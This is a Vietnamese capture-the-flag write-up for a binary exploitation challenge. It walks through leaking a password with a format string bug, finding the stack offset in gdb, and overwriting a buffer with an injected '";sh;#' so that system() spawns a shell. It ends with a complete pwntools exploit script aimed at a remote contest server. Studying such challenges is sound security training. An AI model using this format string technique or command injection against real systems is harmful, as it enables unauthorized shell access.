# 001---Write-up-----KCSC-Recruitment-2026

Hướng dẫn cách giải bài ranacy của giải KCSC-Recruitment-2026

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 16/12/2025

## 1.Mục tiêu cần làm
Bài này bật full lớp bảo vệ nên sẽ khá là khó xơi

<img width="830" height="256" alt="image" src="https://github.com/user-attachments/assets/6bdaec79-426a-4cca-83bf-c00e4a8e0885" />

Nhưng theo mình làm thì mấy cái lớp bảo mật này không liên quan tới quá trình giải lắm. Bài này mình giải cách thuần **Format String** luôn.

Ở đây có 1 chỗ chúng ta có thể khai thác là 

```C
int __cdecl write_passwd(char *passwd)
{
  char cmd[128]; // [rsp+20h] [rbp-90h] BYREF
  unsigned __int64 v3; // [rsp+A8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Password: ");
  printf(passwd);
  putchar(10);
  if ( open("admin", 577, 420LL) >= 0 )
  {
    snprintf(cmd, 0x80uLL, "echo \"%s\" > admin", backup_passwd);
    system(cmd);
    return 0;
  }
  else
  {
    perror("open");
    return 1;
  }
}
```

Nếu chúng ta đè được biến `backup_passwd` bằng 1 lệnh như `/bin/sh` thì nó sẽ thực thi lệnh `system(/bin/sh)`. OK bắt tay vô băm thôi.

## 2.Cách thực thi
Đầu tiên chúng ta phải bypass mật khẩu của chương trình đã.

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  char name[9]; // [rsp+17h] [rbp-99h] BYREF
  char passwd[128]; // [rsp+20h] [rbp-90h] BYREF
  unsigned __int64 v7; // [rsp+A8h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  init();
  gen_passwd(backup_passwd, 0x28uLL);
  printf("Account: ");
  read_line(0, name, 9uLL);
  printf("Account: ");
  printf(name);
  putchar(10);
  printf("Password: ");
  read_line(0, passwd, 0x80uLL);
  v3 = strlen(backup_passwd);
  if ( !strncmp(passwd, backup_passwd, v3) )
  {
    write_passwd(passwd);
  }
  else
  {
    puts("Password is: 123456789");
    puts("You are not an administrator");
    puts("Do you want to be a pwn player???");
    puts("Watch video: https://youtu.be/BSbYN8srw7U?si=q_eH4ZNipi74lLO8");
    puts("Bye bye =)");
  }
  return 0;
}
```

Ở đây có 1 lỗi là `printf("Account: ");`, nếu chúng ta lợi dụng việc nhập `%X$s` thì nó sẽ ra giá trị trên stack, chúng ta hãy nhập tay xem X = ? thì ra mật khẩu ?

Mình vô tình tìm ra X = 7 rồi nên các bạn khỏi tìm.

<img width="345" height="82" alt="image" src="https://github.com/user-attachments/assets/32b91503-0614-4883-8fd5-098d29c26fff" />

Vậy là có password rồi. Giờ tiếp theo là chúng ta thấy 1 lỗi **Buffer Overflow** ở `passwd`. Vậy là chúng ta sẽ tận dụng thêm 1 lần **Format String** nữa là `%n`, lệnh này nó không in cái gì cả, mà nó thực hiện **GHI** ( `Write` ) vào bộ nhớ. Quy tắc : Khi gặp `%n`, printf sẽ đếm xem từ đầu đến giờ nó đã in ra bao nhiêu ký tự, và ghi con số đó vào địa chỉ biến mà bạn cung cấp.

Vậy chúng ta sẽ có payload như sau : `payload = Mật khẩu + ( /bin/sh + %n + địa chỉ backup_add )` là xong. Giờ bắt đầu mổ xẻ từng chỗ 1 nè.

Chúng ta biết rằng `%7$s` sẽ ra mật khẩu tức là `%7sp` sẽ in ra địa chỉ `backup_passwd`. Tiếp theo là phải gõ lệnh `/bin/sh` sao cho khi thực hiện lệnh `echo` xong vẫn thực thi được `/bin/sh`. Ta sẽ ghi là `content_to_write = b'";sh;#\0'`. 

`writes = {target_addr: content_to_write}` code này là tôi muốn ghi `";sh;#\0` vào `target_addr` ( aka `backup_passwd` ). Giờ chúng ta cần 1 lệnh nữa để hoàn thiện việc ghi đè vô địa chỉ `target_addr`.

`payload_fmt = fmtstr_payload(offset=36, writes=writes, write_size='short', numbwritten=16)` : 
1. `numbwritten=16` ( Đã in bao nhiêu rồi ? )
- Giả sử bạn muốn ghi số 100 vào bộ nhớ.
- Vì đã in sẵn 16 ký tự, pwntools chỉ cần in thêm 84 ký tự rác nữa ( Padding ) rồi gọi `%n`.

2. `write_size='short'` ( Chiến thuật chia nhỏ ) : Để ghi đè một chuỗi dài hoặc số lớn, ta không thể ghi 1 lần ( vì phải in ra hàng tỷ ký tự rác -> treo máy hoặc quá dài ). Ta phải chia nhỏ ra ghi từng phần.
- `byte` ( `%hhn `) : Ghi từng 1 byte.
   - **Ưu điểm** : Số lượng ký tự in ra ít.
   - **Nhược điểm**: Payload rất dài ( vì cần nhiều địa chỉ và nhiều `%hhn` ). Dễ bị cắt nếu buffer nhỏ (như bài này 128 byte).

- `short` ( `%hn` ) : Ghi từng 2 byte.
   - **Ưu điểm** : Payload ngắn gọn hơn.
   - **Nhược điểm** : Phải in nhiều ký tự rác hơn một chút, nhưng vẫn ổn.
   - **Tại sao dùng ở đây ?** Vì bộ đệm bài này bé ( 128 byte ), dùng short giúp payload đủ ngắn để chui lọt.

3. `offset = 36` ( Cây cầu nối )
- Khi printf gặp `%n`, nó cần biết địa chỉ cần ghi nằm ở đâu. Trong tấn công **Format String**, chúng ta nhét chính cái địa chỉ `target_addr` vào trong payload chúng ta gửi lên Stack. `offset = 36` bảo cho printf biết : "Này, hãy nhìn vào vị trí thứ 36 trên Stack, địa chỉ tao muốn mày ghi dữ liệu vào đang nằm ở đó đó !!!".

Làm sao để tính ra offset 36 ? Chúng ta hãy mở gdb lên và đặt breakpoint tại lần `print` thứ 2 của `write_passwd`. Sau đó gõ r, chúng ta sẽ ghi `%7$s` để in ra password, sau đó lấy password đó + `AAAAAAAA` gõ vô và enter, lúc này hãy quan sát `REGISTERS`.

<img width="1510" height="443" alt="image" src="https://github.com/user-attachments/assets/66475e76-c662-4afc-88e8-b74f1a53d0fa" />

- Theo quy ước 64-bit, 5 tham số đầu tiên của printf nằm ở : `RSI`, `RDX`, `RCX`, `R8`, `R9`.
- Tương ứng với: `%1$p`, `%2$p`, `%3$p`, `%4$p`, `%5$p`.
- Thực tế: Bạn thấy đấy, `RSI` đang chứa cái chuỗi rác ('Password'), chứ không chứa payload AAAAAAAA (0x41414141...) của chúng ta.
=> **Kết luận** : Payload không nằm trong 5 offset đầu.

Giờ chúng ta hãy gõ `stack 20`

<img width="1522" height="541" alt="image" src="https://github.com/user-attachments/assets/7d1643c0-7929-44b3-b0ad-ea10efa6c659" />

Địa chỉ `RSP `hiện tại là `0x7fffffffdd10` ( ứng với vị trí offset 6 )

Giờ hãy gõ `search -t qword 0x4141414141414141` để tìm xem payload ta nằm ở đâu

<img width="825" height="197" alt="image" src="https://github.com/user-attachments/assets/53e38827-2bfe-4129-a825-12ccc846a7d3" />

Vậy là payload của chúng ta trải dài từ `0x7fffffffdd10` đến `0x7fffffffde00`. Chúng ta hãy tìm khoảng cách của chúng bằng cách `p/x 0x7fffffffdd10 - 0x7fffffffde00`

<img width="564" height="56" alt="image" src="https://github.com/user-attachments/assets/71de1684-6dd3-49ee-94bd-558973d5db1e" />

`0xf0` là 240 byte, chia cho kích thước 1 ô nhớ ( 8 bytes ) : Vì hệ 64-bit, mỗi tham số chiếm 8 bytes. Nên 240 / 8 = 30 ( bước nhảy ). Chúng ta bắt đầu từ offset 6, cần 30 bước nhảy để tới `AAAAAAAA` => `Offset cuối cùng = 30 + 6 = 36`.

Ok giờ chúng ta chỉ cần gửi payload này vào password là xong, vì `if ( !strncmp(passwd, backup_passwd, v3) )` chỉ kiểm tra xem đầu chuỗi có đúng password không. Nếu đúng thì cho qua luôn nên chúng ta vẫn sẽ bypass được tới `write_passwd`.

Vậy là xong, bài này theo mình đánh giá nếu các bạn nạp source + give me flag cho AI là nó dắt các bạn như dắt bò luôn ( người từng trải ). Bài này yêu cầu mức độ am hiểu về **Format String**, xài gdb để coi stack và tìm offset. Thôi dù sao thì cũng đã ra rồi, hãy cho mình 1 star để có động lực viết tiếp nha 🐧.

<img width="639" height="189" alt="image" src="https://github.com/user-attachments/assets/a90e4cdc-bbab-46ae-8355-fa8e06360f8c" />

## 3. Exploit
```Python
from pwn import *

context.binary = binary = ELF('./001', checksec=False)

# p = process('./001')
p = remote('67.223.119.69', 5007)

p.send(b'%7$s%7$p')
p.recvuntil(b'Account: ')
leak_data = p.recvline().strip()

parts = leak_data.split(b'0x')

real_pass = parts[0]
if len(real_pass) > 16:
    real_pass = real_pass[-16:]

leak_addr_hex = b'0x' + parts[1]

target_addr = int(leak_addr_hex, 16)

log.success(f"Leak Password: {real_pass.decode()}")
log.success(f"Target Addr (backup_passwd): {hex(target_addr)}")

content_to_write = b'";sh;#\0'
writes = {target_addr: content_to_write}

payload_fmt = fmtstr_payload(offset=36, writes=writes, write_size='short', numbwritten=16)

final_payload = real_pass + payload_fmt

p.sendlineafter(b'Password: ', final_payload)

p.interactive()
```
